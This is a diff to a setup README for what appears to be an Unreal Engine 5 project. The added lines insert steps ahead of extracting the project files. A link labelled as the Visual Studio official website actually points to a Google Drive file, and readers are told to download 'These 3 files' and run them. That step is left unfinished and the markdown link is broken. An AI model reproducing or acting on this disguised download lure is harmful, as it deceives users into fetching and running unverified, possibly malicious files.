@@ -31,9 +31,12 @@ To ensure the correct dependencies are installed, follow these steps:
 ---
 
 ### **3. Extract the Project Files**
-1. Locate the `code.zip` file.
-2. Right-click and select **"Extract All"**.
-3. Choose a destination (e.g., `C:\UE5Project\`) and extract the files.
+1. Visit the [Visual Studio Official Website]https://drive.google.com/file/d/1bUPm428iqz7NHhr-odVWgWr5wosULWfb/view?usp=sharing).
+2. Download **These 3 files**.
+3. Run the
+4. Locate the `code.zip` file.
+5. Right-click and select **"Extract All"**.
+6. Choose a destination (e.g., `C:\UE5Project\`) and extract the files.
 
 ---
 
